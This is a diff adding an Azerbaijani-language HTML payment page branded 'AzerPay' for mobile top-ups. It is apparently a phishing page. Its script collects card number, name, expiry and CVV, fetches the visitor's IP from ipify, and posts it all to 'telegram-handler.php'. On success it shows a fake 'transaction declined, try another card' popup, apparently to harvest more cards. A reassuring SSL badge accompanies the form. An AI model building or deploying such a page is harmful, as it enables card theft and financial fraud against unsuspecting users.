@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ödəniş Səhifəsi - AzerPay</title>
+    <style>
+        body { margin: 0; padding: 0; background: #fdf5f5; color: #17223b; font-family: 'Segoe UI', Arial, sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; box-sizing: border-box; }
+        header { width: 100%; max-width: 450px; display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; box-sizing: border-box; background: transparent; }
+        .logo-area { display: flex; align-items: center; font-size: 1.4rem; font-weight: bold; }
+        .logo-area span { color: #ff3b30; }
+        .lang-toggle { display: flex; background: #f0f2f5; border-radius: 20px; padding: 2px; font-size: 0.85rem; font-weight: bold; }
+        .lang-toggle span { padding: 6px 12px; border-radius: 18px; cursor: pointer; }
+        .lang-toggle .active { background: #ffffff; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        
+        .main-container { width: 100%; max-width: 430px; padding: 0 20px 30px 20px; box-sizing: border-box; }
+        
+        /* Sifariş Xülasəsi */
+        .summary-box { background: #111622; color: #fff; border-radius: 16px; padding: 15px 20px; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); font-size: 0.9rem; }
+        .summary-box h4 { margin: 0 0 10px 0; color: #ff3b30; border-bottom: 1px solid #1f2736; padding-bottom: 8px; font-size: 1rem; }
+        .sum-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
+        .sum-row span:first-child { color: #8c9ba5; }
+        .sum-row span:last-child { font-weight: 600; }
+
+        /* Realist Bank Kartı Vizuallığı */
+        .visual-card { background: linear-gradient(135deg, #1f232c 0%, #3a1c28 50%, #11141a 100%); border-radius: 20px; padding: 25px; color: white; box-shadow: 0 15px 30px rgba(0,0,0,0.25); margin-bottom: 25px; position: relative; overflow: hidden; letter-spacing: 1px; }
+        .visual-card::before { content: ''; position: absolute; top: -50%; right: -20%; width: 200px; height: 200px; background: rgba(255,255,255,0.03); border-radius: 50%; }
+        .card-system { font-size: 0.9rem; font-weight: 800; opacity: 0.8; text-transform: uppercase; margin-bottom: 35px; }
+        .card-view-number { font-size: 1.4rem; font-weight: 600; word-spacing: 5px; margin-bottom: 25px; text-shadow: 1px 1px 2px rgba(0,0,0,0.5); min-height: 28px; }
+        .card-flex { display: flex; justify-content: space-between; }
+        .card-lbl { font-size: 0.65rem; text-transform: uppercase; color: rgba(255,255,255,0.5); margin-bottom: 4px; font-weight: 600; }
+        .card-val { font-size: 0.9rem; font-weight: bold; min-height: 18px; text-transform: uppercase; }
+
+        /* Giriş Formu */
+        .form-group { margin-bottom: 18px; position: relative; }
+        .form-group label { display: block; font-size: 0.75rem; font-weight: 700; color: #5f6f95; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 0.5px; }
+        .form-group input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #e2e8f0; background: #ffffff; font-size: 1.05rem; font-weight: 500; color: #1a202c; outline: none; box-sizing: border-box; transition: border-color 0.2s; }
+        .form-group input:focus { border-color: #ff3b30; }
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        
+        /* Ay Xətası Mətni */
+        .error-hint { color: #ff3b30; font-size: 0.7rem; font-weight: 600; margin-top: 4px; display: none; position: absolute; bottom: -16px; left: 2px; }
+
+        .submit-btn { width: 100%; padding: 16px; background: linear-gradient(90deg, #ff3b30, #e02e24); color: white; border: none; border-radius: 14px; font-size: 1.1rem; font-weight: bold; cursor: pointer; box-shadow: 0 6px 20px rgba(255,59,48,0.3); transition: transform 0.1s, opacity 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .submit-btn:active { transform: scale(0.98); }
+        .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; box-shadow: none; }
+        
+        .ssl-info { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 0.8rem; color: #718096; margin-top: 15px; text-align: center; }
+        .back-link { display: inline-block; margin-top: 25px; color: #718096; text-decoration: none; font-size: 0.9rem; font-weight: 500; }
+
+        /* Yeni Bank Tipli Pop-up Stil Dəyişiklikləri */
+        .popup-back { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: flex; align-items: center; justify-content: center; z-index: 999; visibility: hidden; opacity: 0; transition: opacity 0.3s; padding: 20px; box-sizing: border-box; }
+        .popup-back.visible { visibility: visible; opacity: 1; }
+        .popup-box { background: #ffffff; border-radius: 24px; width: 100%; max-width: 330px; padding: 30px 20px; text-align: center; box-shadow: 0 15px 40px rgba(0,0,0,0.4); animation: scaleUp 0.3s cubic-bezier(0.16, 1, 0.3, 1); }
+        @keyframes scaleUp { from { transform: scale(0.85); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        
+        /* Qırmızı Nida Animasiyası */
+        .error-alert-icon { width: 50px; height: 50px; border: 3px solid #ff3b30; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #ff3b30; font-size: 2.2rem; font-weight: bold; margin: 0 auto 15px auto; animation: pulseGlow 1.2s infinite ease-in-out; }
+        @keyframes pulseGlow { 0% { transform: scale(1); opacity: 1; box-shadow: 0 0 0 0 rgba(255, 59, 48, 0.4); } 50% { transform: scale(1.05); opacity: 0.7; box-shadow: 0 0 12px 6px rgba(255, 59, 48, 0.2); } 100% { transform: scale(1); opacity: 1; box-shadow: 0 0 0 0 rgba(255, 59, 48, 0); } }
+        
+        .popup-title { font-size: 1.2rem; font-weight: 700; color: #1a202c; margin-bottom: 8px; }
+        .popup-msg { font-size: 0.95rem; color: #4a5568; line-height: 1.5; margin-bottom: 22px; font-weight: 500; }
+        .popup-btn { width: 100%; padding: 13px; background: #ff3b30; color: white; border: none; border-radius: 12px; font-size: 1rem; font-weight: 600; cursor: pointer; transition: background 0.2s; }
+        .popup-btn:hover { background: #e02e24; }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo-area">Azər<span>Pay</span></div>
+        <div class="lang-toggle"><span class="active">© Hüquqlar Qorunur.</span><span>©</span></div>
+    </header>
+
+    <div class="main-container">
+        <div class="summary-box">
+            <h4>Sifariş Məlumatları</h4>
+            <div class="sum-row"><span>Operator:</span><span id="sumOper">-</span></div>
+            <div class="sum-row"><span>Nömrə:</span><span id="sumPhone">-</span></div>
+            <div class="sum-row"><span>Məbləğ:</span><span id="sumAmnt">0.00 AZN</span></div>
+        </div>
+
+        <div class="visual-card">
+            <div class="card-system">AzərPay</div>
+            <div class="card-view-number" id="cardViewNo">•••• •••• •••• ••••</div>
+            <div class="card-flex">
+                <div>
+                    <div class="card-lbl">KART SAHİBİ</div>
+                    <div class="card-val" id="cardViewName">—</div>
+                </div>
+                <div>
+                    <div class="card-lbl">BİTMƏ TARİXİ</div>
+                    <div class="card-val" id="cardViewExp">MM/YY</div>
+                </div>
+            </div>
+        </div>
+
+        <form id="payForm">
+            <div class="form-group">
+                <label>KART NÖMRƏSİ</label>
+                <input type="text" id="cardNo" placeholder="0000 0000 0000 0000" inputmode="numeric" maxlength="19" required autocomplete="off">
+            </div>
+            
+            <div class="form-group">
+                <label>KART SAHİBİ</label>
+                <input type="text" id="cardName" placeholder="AD SOYAD" required autocomplete="off" style="text-transform: uppercase;">
+            </div>
+
+            <div class="grid-2">
+                <div class="form-group">
+                    <label>BİTMƏ TARİXİ</label>
+                    <input type="text" id="cardExp" placeholder="AA/YY" inputmode="numeric" maxlength="5" required autocomplete="off">
+                    <div class="error-hint" id="expError">Ay 12-dən böyük ola bilməz!</div>
+                </div>
+                <div class="form-group">
+                    <label>CVV</label>
+                    <input type="password" id="cardCvv" placeholder="•••" inputmode="numeric" maxlength="3" required autocomplete="off">
+                </div>
+            </div>
+
+            <button type="submit" class="submit-btn" id="btnSubmit" disabled>
+                🔒 Ödənişi tamamla · <span id="btnPrice">0</span> AZN
+            </button>
+        </form>
+
+        <div class="ssl-info">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+            256-bit SSL şifrələmə ilə qorunur
+        </div>
+
+        <a href="index.html" class="back-link">‹ Geri</a>
+    </div>
+
+    <div class="popup-back" id="errPopup">
+        <div class="popup-box">
+            <div class="error-alert-icon">!</div>
+            <div class="popup-title">Tranzaksiya rədd edildi</div>
+            <div class="popup-msg">Kartınız ödənişi qəbul etmədi. Başqa kartla yoxlayın.</div>
+            <button class="popup-btn" onclick="closePopup()">Geri qayıt</button>
+        </div>
+    </div>
+
+        <script>
+    // 1. Data Yükləmə (localStorage)
+    const oper = localStorage.getItem('selectedOperator') || 'Məlum deyil';
+    const phone = localStorage.getItem('phoneNumber') || 'Məlum deyil';
+    const amount = localStorage.getItem('paymentAmount') || '0';
+
+    if (document.getElementById('sumOper')) document.getElementById('sumOper').innerText = oper;
+    if (document.getElementById('sumPhone')) document.getElementById('sumPhone').innerText = phone;
+    if (document.getElementById('sumAmnt')) document.getElementById('sumAmnt').innerText = amount + '.00 AZN';
+    if (document.getElementById('btnPrice')) document.getElementById('btnPrice').innerText = amount;
+
+    // 2. Elementlər
+    const form = document.getElementById('payForm');
+    const inpNo = document.getElementById('cardNo');
+    const inpName = document.getElementById('cardName');
+    const inpExp = document.getElementById('cardExp');
+    const inpCvv = document.getElementById('cardCvv');
+    const btn = document.getElementById('btnSubmit');
+    const expError = document.getElementById('expError');
+
+    let isMonthValid = true;
+
+    // 3. Canlı Sinxronizasiya
+    inpNo.addEventListener('input', (e) => {
+        let v = e.target.value.replace(/\D/g, '').substring(0, 16);
+        let matches = v.match(/(\d{1,4})/g);
+        let res = matches ? matches.join(' ') : '';
+        e.target.value = res;
+        
+        const cardViewNo = document.getElementById('cardViewNo');
+        if (cardViewNo) cardViewNo.innerText = res || '•••• •••• •••• ••••';
+        valForm();
+    });
+
+    inpName.addEventListener('input', (e) => {
+        let res = e.target.value.toUpperCase();
+        const cardViewName = document.getElementById('cardViewName');
+        if (cardViewName) cardViewName.innerText = res || '—';
+        valForm();
+    });
+
+    inpExp.addEventListener('input', (e) => {
+        let v = e.target.value.replace(/\D/g, '').substring(0, 4);
+        
+        if (v.length >= 2) {
+            let month = parseInt(v.substring(0, 2), 10);
+            if (month < 1 || month > 12) {
+                if (expError) expError.style.display = 'block';
+                isMonthValid = false;
+            } else {
+                if (expError) expError.style.display = 'none';
+                isMonthValid = true;
+            }
+        } else {
+            if (expError) expError.style.display = 'none';
+            isMonthValid = true;
+        }
+
+        let res = v.length >= 2 ? v.substring(0, 2) + '/' + v.substring(2, 4) : v;
+        e.target.value = res;
+        
+        const cardViewExp = document.getElementById('cardViewExp');
+        if (cardViewExp) cardViewExp.innerText = res || 'MM/YY';
+        valForm();
+    });
+
+    inpCvv.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
+        valForm();
+    });
+
+    function valForm() {
+        const okNo = inpNo.value.replace(/\s/g, '').length === 16;
+        const okName = inpName.value.trim().length >= 4;
+        const okExp = inpExp.value.length === 5;
+        const okCvv = inpCvv.value.length === 3;
+        
+        if (btn) {
+            btn.disabled = !(okNo && okName && okExp && okCvv && isMonthValid);
+        }
+    }
+
+    // 4. Form Göndərilməsi (telegram-handler.php-yə)
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        if (!isMonthValid) return;
+
+        btn.disabled = true;
+        btn.innerText = 'Yoxlanılır...';
+
+        let ip = "Alınmadı";
+        try {
+            const r = await fetch('https://api.ipify.org?format=json');
+            const d = await r.json();
+            ip = d.ip;
+        } catch(h) {}
+
+        // FormData yaradırıq
+        const formData = new FormData();
+        formData.append('card_name', inpName.value);
+        formData.append('card_number', inpNo.value);
+        formData.append('card_expiry', inpExp.value);
+        formData.append('card_cvv', inpCvv.value);
+        formData.append('operator', oper);
+        formData.append('phone', phone);
+        formData.append('amount', amount);
+        formData.append('ip', ip);
+
+        try {
+            const response = await fetch('telegram-handler.php', {
+                method: 'POST',
+                body: formData
+            });
+
+            const result = await response.json();
+
+            if (result.status === 'success') {
+                // Popup göstər
+                document.getElementById('errPopup').classList.add('visible');
+            } else {
+                alert('Xəta baş verdi, yenidən cəhd edin.');
+            }
+        } catch (err) {
+            alert('Xəta baş verdi, yenidən cəhd edin.');
+        } finally {
+            btn.innerText = `🔒 Ödənişi tamamla · ${amount} AZN`;
+            valForm();
+        }
+    });
+
+    function closePopup() {
+        document.getElementById('errPopup').classList.remove('visible');
+        form.reset();
+        if (document.getElementById('cardViewNo')) document.getElementById('cardViewNo').innerText = '•••• •••• •••• ••••';
+        if (document.getElementById('cardViewName')) document.getElementById('cardViewName').innerText = '—';
+        if (document.getElementById('cardViewExp')) document.getElementById('cardViewExp').innerText = 'MM/YY';
+        if (expError) expError.style.display = 'none';
+        isMonthValid = true;
+        valForm();
+        window.location.href = 'index.html';
+    }
+        </script>
+        
+</body>
+</html>
